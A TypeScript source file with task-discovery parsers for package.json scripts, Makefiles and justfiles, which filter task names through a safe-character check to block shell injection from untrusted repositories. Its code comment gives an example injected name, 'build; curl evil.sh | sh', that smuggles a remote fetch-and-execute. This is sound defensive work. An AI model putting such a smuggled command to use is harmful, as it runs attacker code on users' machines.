/**
 * Pure parsers behind auto-discovery. Each one takes file text and returns runnable tasks.
 */
import { parseJsonc } from '../model/jsonc';

export type PackageManager = 'npm' | 'pnpm' | 'yarn' | 'bun';

/**
 * Characters a discovered name may contain and still be safe to drop into a command line
 * unquoted.
 *
 * Discovery reads names out of files that belong to whatever repository happens to be open, so
 * they are untrusted input. A `package.json` can legally declare a script called
 * `build; curl evil.sh | sh`, and the resulting command would be sent to a terminal as one line.
 * Names that cannot be represented safely are skipped rather than escaped: a task nobody can name
 * sanely is not worth running, and quoting rules differ per shell.
 */
const SAFE_TASK_NAME = /^[A-Za-z0-9._:@/+-]+$/;

export function isSafeTaskName(name: string): boolean {
  return name.length > 0 && name.length <= 128 && SAFE_TASK_NAME.test(name);
}

export interface DiscoveredTask {
  /** Stable within its source, e.g. the script or target name. */
  name: string;
  /** The shell command that runs it. */
  command: string;
  /** What the underlying definition says, when it differs from `command`. */
  detail?: string;
}

const LOCKFILES: ReadonlyArray<readonly [string, PackageManager]> = [
  ['bun.lockb', 'bun'],
  ['bun.lock', 'bun'],
  ['pnpm-lock.yaml', 'pnpm'],
  ['yarn.lock', 'yarn'],
  ['package-lock.json', 'npm'],
  ['npm-shrinkwrap.json', 'npm'],
];

/** Picks a package manager from the lockfiles present at a workspace root. Defaults to npm. */
export function detectPackageManager(rootFiles: readonly string[]): PackageManager {
  for (const [lockfile, manager] of LOCKFILES) {
    if (rootFiles.includes(lockfile)) return manager;
  }
  return 'npm';
}

export function runScriptCommand(manager: PackageManager, script: string): string {
  switch (manager) {
    case 'yarn':
      return `yarn ${script}`;
    case 'pnpm':
      return `pnpm run ${script}`;
    case 'bun':
      return `bun run ${script}`;
    case 'npm':
    default:
      return `npm run ${script}`;
  }
}

/** Reads the `scripts` block of a `package.json`. */
export function parsePackageScripts(
  text: string,
  manager: PackageManager = 'npm',
): DiscoveredTask[] {
  const parsed = parseJsonc<{ scripts?: Record<string, unknown> }>(text);
  const scripts = parsed?.scripts;
  if (!scripts || typeof scripts !== 'object') return [];
  const tasks: DiscoveredTask[] = [];
  for (const [name, value] of Object.entries(scripts)) {
    if (typeof value !== 'string' || !isSafeTaskName(name)) continue;
    tasks.push({ name, command: runScriptCommand(manager, name), detail: value });
  }
  return tasks;
}

const MAKE_TARGET = /^([^\s:=#][^:=#]*):(?!=)/;

/** Reads phony/real targets out of a Makefile, skipping variables and pattern rules. */
export function parseMakefileTargets(text: string): DiscoveredTask[] {
  const seen = new Set<string>();
  const tasks: DiscoveredTask[] = [];
  for (const rawLine of text.split(/\r?\n/)) {
    if (rawLine.startsWith('\t') || rawLine.startsWith(' ')) continue;
    const line = rawLine.trim();
    if (line.length === 0 || line.startsWith('#')) continue;
    const match = MAKE_TARGET.exec(line);
    if (!match) continue;
    for (const name of match[1]!.trim().split(/\s+/)) {
      if (name.length === 0) continue;
      if (name.startsWith('.')) continue; // .PHONY, .DEFAULT_GOAL, …
      if (name.includes('%') || name.includes('$')) continue; // pattern and generated rules
      if (!isSafeTaskName(name)) continue; // untrusted file; see SAFE_TASK_NAME
      if (seen.has(name)) continue;
      seen.add(name);
      tasks.push({ name, command: `make ${name}` });
    }
  }
  return tasks;
}

const JUST_ASSIGNMENT = /^@?[A-Za-z0-9_][A-Za-z0-9_-]*\s*:=/;
const JUST_RECIPE = /^@?([A-Za-z0-9_][A-Za-z0-9_-]*)((?:\s+[^:]*)?):(?!=)/;

/** Reads recipe names out of a justfile, skipping assignments, settings and comments. */
export function parseJustfileRecipes(text: string): DiscoveredTask[] {
  const seen = new Set<string>();
  const tasks: DiscoveredTask[] = [];
  for (const rawLine of text.split(/\r?\n/)) {
    if (rawLine.startsWith('\t') || rawLine.startsWith(' ')) continue;
    const line = rawLine.trim();
    if (line.length === 0 || line.startsWith('#') || line.startsWith('[')) continue;
    if (/^(alias|set|export|import)\b/.test(line)) continue;
    if (JUST_ASSIGNMENT.test(line)) continue;
    const match = JUST_RECIPE.exec(line);
    if (!match) continue;
    const name = match[1]!;
    if (!isSafeTaskName(name)) continue;
    if (seen.has(name)) continue;
    seen.add(name);
    const parameters = match[2]!.trim();
    tasks.push(
      parameters.length > 0
        ? { name, command: `just ${name}`, detail: `${name} ${parameters}` }
        : { name, command: `just ${name}` },
    );
  }
  return tasks;
}
